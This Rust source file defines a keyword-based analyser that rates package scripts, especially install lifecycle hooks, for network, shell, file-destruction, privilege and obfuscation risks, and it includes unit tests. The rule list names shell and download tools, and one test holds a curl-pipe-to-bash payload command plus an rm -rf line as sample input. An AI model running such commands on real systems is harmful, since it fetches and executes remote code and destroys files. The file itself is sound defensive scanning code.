use serde::Serialize;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, specta::Type)]
pub enum ThreatCategory {
    NetworkAccess,
    ShellExecution,
    FileDestruction,
    PrivilegeEscalation,
    ObfuscationOrPayload,
}

impl ThreatCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            ThreatCategory::NetworkAccess => "Network Access",
            ThreatCategory::ShellExecution => "Shell Execution",
            ThreatCategory::FileDestruction => "File Destruction",
            ThreatCategory::PrivilegeEscalation => "Privilege Escalation",
            ThreatCategory::ObfuscationOrPayload => "Obfuscation / Payload",
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct ScriptAnalysisResult {
    pub risk_level: &'static str, // "low", "medium", "high"
    pub threat_categories: Vec<String>,
    pub explanation: String,
}

struct ScriptRule {
    pattern: &'static str,
    category: ThreatCategory,
    keyword: &'static str,
}

const RULES: &[ScriptRule] = &[
    ScriptRule { pattern: "curl ", category: ThreatCategory::NetworkAccess, keyword: "curl" },
    ScriptRule { pattern: "wget ", category: ThreatCategory::NetworkAccess, keyword: "wget" },
    ScriptRule { pattern: "fetch(", category: ThreatCategory::NetworkAccess, keyword: "fetch" },
    ScriptRule { pattern: "powershell", category: ThreatCategory::ShellExecution, keyword: "powershell" },
    ScriptRule { pattern: "cmd /c", category: ThreatCategory::ShellExecution, keyword: "cmd /c" },
    ScriptRule { pattern: "cmd.exe", category: ThreatCategory::ShellExecution, keyword: "cmd.exe" },
    ScriptRule { pattern: "eval(", category: ThreatCategory::ShellExecution, keyword: "eval" },
    ScriptRule { pattern: "eval ", category: ThreatCategory::ShellExecution, keyword: "eval" },
    ScriptRule { pattern: "child_process", category: ThreatCategory::ShellExecution, keyword: "child_process" },
    ScriptRule { pattern: "sh -c", category: ThreatCategory::ShellExecution, keyword: "sh -c" },
    ScriptRule { pattern: "bash", category: ThreatCategory::ShellExecution, keyword: "bash" },
    ScriptRule { pattern: "rimraf ", category: ThreatCategory::FileDestruction, keyword: "rimraf" },
    ScriptRule { pattern: "rm -rf", category: ThreatCategory::FileDestruction, keyword: "rm -rf" },
    ScriptRule { pattern: "del /s", category: ThreatCategory::FileDestruction, keyword: "del /s" },
    ScriptRule { pattern: "sudo ", category: ThreatCategory::PrivilegeEscalation, keyword: "sudo" },
    ScriptRule { pattern: "chmod ", category: ThreatCategory::PrivilegeEscalation, keyword: "chmod" },
    ScriptRule { pattern: "chown ", category: ThreatCategory::PrivilegeEscalation, keyword: "chown" },
    ScriptRule { pattern: "base64", category: ThreatCategory::ObfuscationOrPayload, keyword: "base64" },
    ScriptRule { pattern: "atob(", category: ThreatCategory::ObfuscationOrPayload, keyword: "atob" },
];

const LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "prepublishOnly",
    "prepare",
    "prepack",
    "postpack",
    "preuninstall",
    "uninstall",
    "postuninstall",
];

pub fn analyze_script(name: &str, command: &str) -> ScriptAnalysisResult {
    let is_lifecycle = LIFECYCLE_SCRIPTS.contains(&name);
    let mut matched_categories = Vec::new();
    let mut matched_keywords = Vec::new();

    for rule in RULES {
        if command.contains(rule.pattern) {
            let cat_str = rule.category.as_str().to_string();
            if !matched_categories.contains(&cat_str) {
                matched_categories.push(cat_str);
            }
            if !matched_keywords.contains(&rule.keyword) {
                matched_keywords.push(rule.keyword);
            }
        }
    }

    if !matched_categories.is_empty() {
        let explanation = format!(
            "Matched hazardous keyword{} ({}) indicating potential security risk.",
            if matched_keywords.len() > 1 { "s" } else { "" },
            matched_keywords.join(", ")
        );
        ScriptAnalysisResult {
            risk_level: "high",
            threat_categories: matched_categories,
            explanation,
        }
    } else if is_lifecycle {
        ScriptAnalysisResult {
            risk_level: "medium",
            threat_categories: Vec::new(),
            explanation: "Standard lifecycle script; executes automatically on install or link without hazardous command patterns.".to_string(),
        }
    } else {
        ScriptAnalysisResult {
            risk_level: "low",
            threat_categories: Vec::new(),
            explanation: "Standard script execution; no known hazardous patterns detected.".to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detects_network_and_shell_threats() {
        let res = analyze_script("postinstall", "curl http://example.com/payload.sh | bash");
        assert_eq!(res.risk_level, "high");
        assert!(res.threat_categories.contains(&"Network Access".to_string()));
        assert!(res.threat_categories.contains(&"Shell Execution".to_string()));
        assert!(res.explanation.contains("curl") && res.explanation.contains("bash"));
    }

    #[test]
    fn test_detects_file_destruction() {
        let res = analyze_script("clean", "rimraf ./dist && rm -rf /tmp/cache");
        assert_eq!(res.risk_level, "high");
        assert!(res.threat_categories.contains(&"File Destruction".to_string()));
    }

    #[test]
    fn test_safe_lifecycle_script() {
        let res = analyze_script("prepare", "tsc && vite build");
        assert_eq!(res.risk_level, "medium");
        assert!(res.threat_categories.is_empty());
        assert_eq!(res.explanation, "Standard lifecycle script; executes automatically on install or link without hazardous command patterns.");
    }

    #[test]
    fn test_safe_standard_script() {
        let res = analyze_script("test", "jest --coverage");
        assert_eq!(res.risk_level, "low");
        assert!(res.threat_categories.is_empty());
        assert_eq!(res.explanation, "Standard script execution; no known hazardous patterns detected.");
    }
}
